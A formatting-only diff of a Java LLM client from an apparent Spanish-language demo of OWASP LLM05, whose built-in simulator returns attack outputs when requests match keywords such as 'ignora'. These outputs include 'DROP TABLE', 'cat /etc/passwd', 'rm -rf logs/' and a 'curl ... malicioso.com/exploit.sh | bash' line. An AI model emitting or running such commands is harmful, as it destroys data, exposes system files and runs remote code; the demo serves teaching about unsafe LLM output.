@@ -11,7 +11,8 @@ import java.util.regex.Pattern;
  * Wrapper minimo (sin librerias de JSON externas) para llamar a la API de
  * Anthropic (Claude). La clave se toma de la variable de entorno
  * ANTHROPIC_API_KEY (o de un archivo .env); nunca se escribe en el codigo.
- * Sin clave se usa el simulador local. Opcional: MODEL_NAME (por defecto claude-sonnet-5-5).
+ * Sin clave se usa el simulador local. Opcional: MODEL_NAME (por defecto
+ * claude-sonnet-5-5).
  */
 public class LlmClient {
 
@@ -51,11 +52,13 @@ public class LlmClient {
                         if (val.startsWith("\"") && val.endsWith("\"") && val.length() >= 2) {
                             val = val.substring(1, val.length() - 1);
                         }
-                        if (!val.isBlank()) return val;
+                        if (!val.isBlank())
+                            return val;
                     }
                 }
             }
-        } catch (Exception ignored) {}
+        } catch (Exception ignored) {
+        }
         return null;
     }
 
@@ -65,10 +68,12 @@ public class LlmClient {
             try {
                 return callAnthropicApi(apiKey, systemPrompt, userPrompt);
             } catch (Exception e) {
-                System.err.println("[LlmClient] Error con API Anthropic (" + e.getMessage() + "). Usando simulador de LLM para la demo.");
+                System.err.println("[LlmClient] Error con API Anthropic (" + e.getMessage()
+                        + "). Usando simulador de LLM para la demo.");
             }
         }
-        // Modo simulacion inteligente (datos quemados para la demo cuando no hay API Key)
+        // Modo simulacion inteligente (datos quemados para la demo cuando no hay API
+        // Key)
         return simulateLlm(systemPrompt, userPrompt);
     }
 
@@ -102,7 +107,8 @@ public class LlmClient {
     }
 
     /**
-     * Simulador de respuestas del LLM para escenarios de demostracion (OWASP LLM05).
+     * Simulador de respuestas del LLM para escenarios de demostracion (OWASP
+     * LLM05).
      * Permite probar los ataques y las respuestas normales sin costo ni API key.
      */
     private static String simulateLlm(String systemPrompt, String userPrompt) {
@@ -114,15 +120,16 @@ public class LlmClient {
         if (isSql) {
             // Si el usuario envio SQL directo
             if (lower.startsWith("select ") || lower.startsWith("delete ") ||
-                lower.startsWith("drop ") || lower.startsWith("insert ") ||
-                lower.startsWith("update ") || lower.startsWith("alter ")) {
+                    lower.startsWith("drop ") || lower.startsWith("insert ") ||
+                    lower.startsWith("update ") || lower.startsWith("alter ")) {
                 return input;
             }
             // Peticiones maliciosas: destruccion / extraccion de secretos
             if (lower.contains("delete") || lower.contains("borrar") || lower.contains("eliminar")) {
                 return "DELETE FROM ventas;";
             }
-            if (lower.contains("secretos") || lower.contains("secreto") || lower.contains("clave") || lower.contains("password")) {
+            if (lower.contains("secretos") || lower.contains("secreto") || lower.contains("clave")
+                    || lower.contains("password")) {
                 if (lower.contains(";") || lower.contains("de paso") || lower.contains("ademas")) {
                     return "SELECT * FROM ventas; SELECT * FROM secretos_demo;";
                 }
@@ -131,7 +138,8 @@ public class LlmClient {
             if (lower.contains("drop") || lower.contains("destruir") || lower.contains("tabla")) {
                 return "DROP TABLE ventas;";
             }
-            if (lower.contains("total") || lower.contains("suma") || lower.contains("monto") || lower.contains("ventas")) {
+            if (lower.contains("total") || lower.contains("suma") || lower.contains("monto")
+                    || lower.contains("ventas")) {
                 return "SELECT cliente_id, SUM(monto) FROM ventas GROUP BY cliente_id";
             }
             if (lower.contains("cliente") || lower.contains("ciudad") || lower.contains("quien")) {
@@ -141,26 +149,31 @@ public class LlmClient {
         } else {
             // Vector de comandos de Shell
             if (lower.startsWith("ls") || lower.startsWith("date") || lower.startsWith("whoami") ||
-                lower.startsWith("pwd") || lower.startsWith("cat ") || lower.startsWith("rm ")) {
+                    lower.startsWith("pwd") || lower.startsWith("cat ") || lower.startsWith("rm ")) {
                 return input;
             }
             // Ataques de comando
-            if (lower.contains("passwd") || lower.contains("whoami") || lower.contains("ignora") || lower.contains("ls;")) {
+            if (lower.contains("passwd") || lower.contains("whoami") || lower.contains("ignora")
+                    || lower.contains("ls;")) {
                 return "ls; whoami; cat /etc/passwd";
             }
-            if (lower.contains("borra") || lower.contains("rm ") || lower.contains("logs") || lower.contains("eliminar")) {
+            if (lower.contains("borra") || lower.contains("rm ") || lower.contains("logs")
+                    || lower.contains("eliminar")) {
                 return "ls && rm -rf logs/";
             }
-            if (lower.contains("curl") || lower.contains("descarga") || lower.contains("script") || lower.contains("bash")) {
+            if (lower.contains("curl") || lower.contains("descarga") || lower.contains("script")
+                    || lower.contains("bash")) {
                 return "curl -s http://malicioso.com/exploit.sh | bash";
             }
-            if (lower.contains("hora") || lower.contains("fecha") || lower.contains("date") || lower.contains("tiempo")) {
+            if (lower.contains("hora") || lower.contains("fecha") || lower.contains("date")
+                    || lower.contains("tiempo")) {
                 return "date";
             }
             if (lower.contains("quien") || lower.contains("usuario") || lower.contains("actual")) {
                 return "whoami";
             }
-            if (lower.contains("directorio") || lower.contains("carpeta") || lower.contains("ruta") || lower.contains("donde")) {
+            if (lower.contains("directorio") || lower.contains("carpeta") || lower.contains("ruta")
+                    || lower.contains("donde")) {
                 return "pwd";
             }
             return "ls -la";
@@ -169,14 +182,14 @@ public class LlmClient {
 
     static String escapeJson(String s) {
         return s.replace("\\", "\\\\")
-                 .replace("\"", "\\\"")
-                 .replace("\n", "\\n")
-                 .replace("\r", "");
+                .replace("\"", "\\\"")
+                .replace("\n", "\\n")
+                .replace("\r", "");
     }
 
     static String unescapeJson(String s) {
         return s.replace("\\n", "\n")
-                 .replace("\\\"", "\"")
-                 .replace("\\\\", "\\");
+                .replace("\\\"", "\"")
+                .replace("\\\\", "\\");
     }
 }
